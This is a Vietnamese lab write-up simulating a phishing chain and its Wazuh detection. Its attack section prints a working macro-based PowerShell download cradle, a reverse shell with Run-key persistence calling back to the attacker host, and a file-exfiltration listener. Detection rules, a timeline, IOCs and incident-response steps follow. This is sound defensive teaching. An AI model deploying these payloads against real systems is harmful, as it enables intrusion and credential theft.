---
title: "SOC-mini 01: Mô phỏng tấn công và phát hiện với Wazuh"
date: 2025-08-16 12:00:00 +0700
categories: [SIEM, Wazuh]
tags: [SOC mini]
image: /assets/images4/banner.png
toc: true
layout: post
---

## Attack Chain

- Attacker: Kali Linux (192.168.200.132)
- Victim: Windows (192.168.200.137)

### Details:

#### 1. Email Phishing

- Attacker gửi email `zip` tới victim
![image](assets/images4/1.png)

- Giải nén nhận được 1 file `.xlsm`

![image](assets/images4/2.png)


#### 2. Macro VBA excute

- Nội dung đoạn mã:

```vb
Private Sub Workbook_Open()
    Dim cmd As String
    cmd = "powershell -w hidden -nop -c ""Invoke-WebRequest 'http://192.168.200.132:8000/Test.ps1' -OutFile $env:TEMP\payload.ps1; powershell -ep bypass -f $env:TEMP\payload.ps1"""
    Shell cmd, vbHide
End Sub
```

- Thực hiện tải file độc hại `Test.ps1` từ máy `Kali`, lưu vào thư mục `TEMP` với tên là `payload.ps1` và tiến hành thực thi script

#### Victim
![image](assets/images4/3.png)

#### Attacker
- Nội dung `Test.ps1`

```powershell
$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$Name = "OfficeUpdate"
$Value = "powershell.exe -w hidden -ep bypass -File `"$env:TEMP\payload.ps1`""

if (-not (Get-ItemProperty -Path $RegPath -Name $Name -ErrorAction SilentlyContinue)) {
    try {
        New-ItemProperty -Path $RegPath -Name $Name -Value $Value -PropertyType "String" | Out-Null
    } catch {}
}

$client = New-Object System.Net.Sockets.TCPClient('192.168.200.132',4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}

while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
    $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}

$client.Close()
```

- Thiết lập `persistent` đồng thời `reverse shell` về máy chủ `Kali`
![image](assets/images4/4.png)

#### 3. Data Exfiltration

- Sau khi thấy được file `Password.txt`, attacker thực hiện mở `POST` method để lấy file về

```python
from http.server import BaseHTTPRequestHandler, HTTPServer

class SimpleHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(length)
        with open("Password.txt", "wb") as f:
            f.write(post_data)
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"File received successfully")

if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 8000), SimpleHandler)
    print("Listening on port 8000...")
    server.serve_forever()
```
![image](assets/images4/5.png)

- Trích xuất thành công
![image](assets/images4/6.png)

### Summary

| Step | Attacker Action | Victim Action | Result |
|------|-----------------|---------------|--------|
| 1 | **Email Phishing** – Attacker gửi email `.zip` chứa file `.xlsm` độc hại | Victim tải file về | File độc hại vào máy Victim |
| 2 |  – | Victim giải nén `.zip`, thu được `.xlsm` | File sẵn sàng mở |
| 3 | **Macro Execution** – VBA Macro chứa lệnh tải và chạy script | Victim mở file và enable Macro | PowerShell được khởi chạy ngầm |
| 4 | **Payload Download** – Macro dùng `Invoke-WebRequest` tải `Test.ps1` từ Kali (`192.168.200.132`) | – | File `payload.ps1` lưu tại `%TEMP%` |
| 5 | **Payload Execution** – PowerShell chạy `payload.ps1`| – | Reverse shell kết nối về Attacker và cơ chế `persistent` được thiết lập|
| 6 | **Reverse Shell** – `payload.ps1` tạo kết nối ngược về `Kali`| – | Attacker có shell điều khiển từ xa |
| 7 | **File Discovery** – Attacker dùng shell duyệt thư mục `Documents` tìm thấy `Password.txt` | – | Phát hiện file chứa thông tin nhạy cảm |
| 8 | **Data Exfiltration** – Attacker chạy PowerShell script đọc `Password.txt` và POST về server Kali port 8000 | – | File dữ liệu được gửi thành công sang máy Attacker |

----------------------------------------------------------------------

## Wazuh Detection

### Custom Rules

- Nếu để mặc định của Wazuh thì có một số tình huống sẽ không bắt được `logs` nên mình có viết một số `rules` dựa theo nhưng `rules` mặc định của `Wazuh`, tham khảo thêm 1 số tài liệu và tùy chỉnh để cho phù hợp

#### Persistence

```xml
<group name="sysmon,sysmon_eid13_detections,windows,">

  <rule id="92300" level="0">
    <if_group>sysmon_event_13</if_group>
    <field name="win.eventdata.targetObject" type="pcre2">(?i)SOFTWARE\\\\(WOW6432NODE\\\\M|M)ICROSOFT\\\\WINDOW(S|S NT)\\\\CURRENTVERSION\\\\(RUN|TERMINAL SERVER\\\\INSTALL\\\\SOFTWARE\\\\MICROSOFT\\\\WINDOWS\\\\CURRENTVERSION\\\\RUN)</field>
    <options>no_full_log</options>
    <description>Added registry content to be executed on next logon</description>
    <mitre>
      <id>T1547.001</id>
    </mitre>
  </rule>
  
  <rule id="192302" level="15">
    <if_sid>92300</if_sid>
    <field name="win.eventdata.image" type="pcre2">(?i)(reg|powershell|pwsh)\.exe</field>
    <options>no_full_log</options>
    <description>Registry entry to be executed on next logon was modified using command line application</description>
    <mitre>
      <id>T1547.001</id>
    </mitre>
  </rule>

</group>
```

#### Reverse Shell

```xml
<group name="powershell_rules" comment="PowerShell rules - concise MITRE tags">

  <rule id="100206" level="15">
    <if_sid>60009</if_sid>
    <field name="win.eventdata.contextInfo" type="pcre2">(?i)Invoke-WebRequest|IWR.*-url|IWR.*-InFile</field>
    <description>Invoke-WebRequest executed, possible download cradle detected.</description>

    <mitre>
      <id>T1059.001</id> <!-- PowerShell -->
      <id>T1105</id>     <!-- Download -->
    </mitre>
  </rule>
  
  <rule id="100502" level="15">
    <if_group>60009</if_group>
    <field name="win.eventdata.scriptBlockText" type="pcre2">(?i)tcpclient</field>
    <description>Powershell created a new TCPClient - possible reverse shell.</description>

    <mitre>
      <id>T1059.001</id> <!-- PowerShell -->
      <id>T1071</id>     <!-- C2 -->
      <!-- <id>T1071.001</id>  Optional: Web -->
    </mitre>
  </rule>

</group>
```

- Victim host: DESKTOP-O674VPH (`192.168.200.137`, user `DESKTOP-O674VPH\noname`)
- Attacker host: `192.168.200.132` (HTTP :8000, TCP :4444)
- Date (UTC): `2025-08-14 ~15:56:57 → 15:57:47`
- Logging: `Wazuh`, `Sysmon`, `Powershell`

### Executive Summary

- Tải một PowerShell payload từ `http://192.168.200.132:8000/Test.ps1` và ghi xuống `C:\Users\noname\AppData\Local\Temp\payload.ps1`.
- Thực thi payload với -ep bypass.
- Cài `persistence` qua `Run key: OfficeUpdate`.
- Thiết lập reverse shell `TCP` tới `192.168.200.132:4444`.
- Gửi HTTP POST về `192.168.200.132:8000/` với dữ liệu ASCII chứa thông tin tài khoản `BANK và FB (Facebook)` → `Exfiltration`.
- Mức độ: __Critical__ `Execution + Persistence + C2 + Data Exfil`.

### Details

#### 1. Aug 14, 2025 - 15:56:58.071

- Event ID: `4103 - PowerShell Operational`
- Rule ID: `100206`
- Rule description: `Invoke Webrequest executed, possible download cradle detected.`
- Detail: `Command Invocation: Invoke-WebRequest`: `http://192.168.200.132:8000/Test.ps1' -OutFile $env:TEMP\payload.ps1; powershell -ep bypass -f $env:TEMP\payload.ps1`
![image](assets/images4/7.png)

#### 2. Aug 14, 2025 - 15:56:58.884

- Event ID: `11 - Sysmon`
- Rule ID: `92213`
- Rule description: `Executable file dropped in folder commonly used by malware`
- Rule level : `15`
- Detail: `File created`: `C:\Users\noname\AppData\Local\Temp\payload.ps1`
![image](assets/images4/8.png)

#### 3. Aug 14, 2025 - 15:56:58.885

- Event ID: `1 - Sysmon`
- Rule ID: `92029`
- Rule description: `Powershell executed script from suspicious location`
- Rule level : `15`
- Detail: `Process Create`: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ep bypass -f C:\Users\noname\AppData\Local\Temp\payload.ps1`
![image](assets/images4/9.png)

#### 4. Aug 14, 2025 - 15:56:58.915

- Event ID: `13 - Sysmon`
- Rule ID: `192302`
- Rule description: `Registry entry to be executed on next logon was modified using command line application`
- Rule level : `15`
- Detail: `Registry value set`: `HKU\S-1-5-...\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\OfficeUpdate`
![image](assets/images4/10.png)

#### 5. Aug 14, 2025 - 15:56:58.995

- Event ID: `4104 - Powershell/Operational`
- Rule ID: `100502`
- Rule description: `Powershell created a new TCPClient - possible reverse shell.`
- Rule level : `15`
- Detail: `Reverse Shell`: `TCPClient('192.168.200.132',4444)`
![image](assets/images4/11.png)

#### 6. Aug 14, 2025 - 15:57:47.948

- Event ID: `4103 - PowerShell/Operational`
- Rule ID: `100206`
- Rule description: `Invoke Webrequest executed, possible download cradle detected.`
- Rule level : `15`
- Detail: `Data Exfiltration`
![image](assets/images4/12.png)

## MITRE ATT&CK

![image](assets/images4/13.png)

### Details:

| # | Timestamp (UTC+7)       | Event ID / Rule ID | Description                                                                                     | MITRE ATT\&CK Tactic               | MITRE ATT\&CK Technique (ID / Name)                                                 |
| - | ----------------------- | ------------------ | ----------------------------------------------------------------------------------------------- | ---------------------------------- | ----------------------------------------------------------------------------------- |
| 1 | 2025-08-14 15:56:58.071 | 4103 / 100206      | **Invoke-WebRequest** tải `Test.ps1` từ máy chủ `192.168.200.132` và lưu thành `payload.ps1`    | **Command and Control**            | **T1105 – Ingress Tool Transfer** (Tải công cụ/payload từ máy chủ C2)               |
| 2 | 2025-08-14 15:56:58.884 | 11 / 92213         | File `payload.ps1` được tạo trong thư mục `%TEMP%`                                              | **Command and Control**            | **T1105 – Ingress Tool Transfer** (Lưu trữ công cụ độc hại tại endpoint)            |
| 3 | 2025-08-14 15:56:58.885 | 1 / 92029          | `powershell.exe -ep bypass -f payload.ps1` được thực thi từ vị trí đáng ngờ                     | **Execution**                      | **T1059.001 – Command and Scripting Interpreter: PowerShell**                       |
| 4 | 2025-08-14 15:56:58.915 | 13 / 192302        | Sửa registry key `HKCU\...\Run\OfficeUpdate` để thực thi khi đăng nhập                          | **Persistence / Privilege Escal.** | **T1547.001 – Boot or Logon Autostart Execution: Registry Run Keys/Startup Folder** |
| 5 | 2025-08-14 15:56:58.995 | 4104 / 100502      | PowerShell tạo TCPClient kết nối `192.168.200.132:4444` (reverse shell)                         | **Command and Control**            | **T1071.004 – Application Layer Protocol: Web Protocols** *(hoặc T1071 chung)*      |
| 6 | 2025-08-14 15:57:47.948 | 4103 / 100206      | PowerShell tiếp tục sử dụng `Invoke-WebRequest` (để `exfil` dữ liệu)| **Exfiltration / C2**              | **T1041 – Exfiltration Over C2 Channel**|

## IOC

#### Network

- IP (attacker): 192.168.200.132
- Ports: HTTP 8000 (ingress/tool transfer & exfil), TCP 4444 (reverse shell)
- URL: http://192.168.200.132:8 000/Test.ps1
- HTTP POST target: http://192.168.200.132:8000/ (exfil via POST)

#### Host / Files

- Malicious spreadsheet: *.xlsm (macro-enabled)
- Downloaded payload: %TEMP%\payload.ps1
- e.g. C:\Users\noname\AppData\Local\Temp\payload.ps1
- Original script on attacker: Test.ps1
- Exfiltrated file example: Password.txt

#### Registry / Persistence

- Run key: HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\OfficeUpdate
- Registry value content: powershell.exe -w hidden -ep bypass -File "$env:TEMP\payload.ps1"

#### Processes / Commandlines
- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -f C:\Users\...\AppData\Local\Temp\payload.ps1
- Macro command: powershell -w hidden -nop -c "Invoke-WebRequest 'http://192.168.200.132:8000/Test.ps1' -OutFile $env:TEMP\payload.ps1; powershell -ep bypass -f $env:TEMP\payload.ps1"
- Powershell code pattern: New-Object System.Net.Sockets.TCPClient('192.168.200.132',4444) or TCPClient(

#### Timestamps (from your logs)
- 2025-08-14 15:56:58 → 15:57:47 (UTC) — useful for narrowing windows of compromise in investigations

## Incident response

#### Isolate

- Ngắt mạng host bị compromise (DESKTOP-O674VPH / 192.168.200.137) khỏi mạng tức thì (vlan/port, hoặc kéo cable).
- Nếu không thể cắt hoàn toàn, chặn outbound tới 192.168.200.132 và port 4444/8000 trên firewall / NGFW.

#### Triage & Preserve

- Chụp ảnh bộ nhớ (memory dump) và lấy snapshot EDR (nếu có). Ghi chú: lưu evidence trước khi reboot.
- Copy/snapshot: %TEMP%\payload.ps1, any suspicious *.xlsm, Password.txt, Windows Event Log, Sysmon logs, PowerShell logs (operational), registry hives (NTUSER.DAT).

#### Contain & Kill C2

- Trên host: tìm PID kết nối tới 192.168.200.132:4444 (e.g. netstat -ano | findstr 4444) → taskkill /PID <pid> /F.
- Xóa registry Run value: `reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v OfficeUpdate /f`
- Remove file(s): `del /f /q "%TEMP%\payload.ps1"` (sau khi đã thu thập), xóa file macro copy, v.v.

#### Eradicate
- Scan toàn hệ thống bằng EDR/AV, kiểm tra các user login gần thời điểm tấn công, scheduled tasks, services, Startup folders, WMI persistence, RunOnce, COM object registrations.
- Reset credentials của account có thể bị lộ (local + domain if applicable). Đặt mật khẩu mới.

#### Recovery
- Nếu host integrity nghi ngờ cao: rebuild OS image. Nếu restore, làm từ known good image, patch, harden trước khi đưa vào mạng.
- Tăng giám sát trên các endpoints và bật IDS/IPS signatures cho những IP / URL liên quan.

#### Post-incident
- Ảnh forensic -> timeline, IOC feed, notify stakeholders, rotate credentials, review email gateway filter, user awareness (người dùng đã enable macro).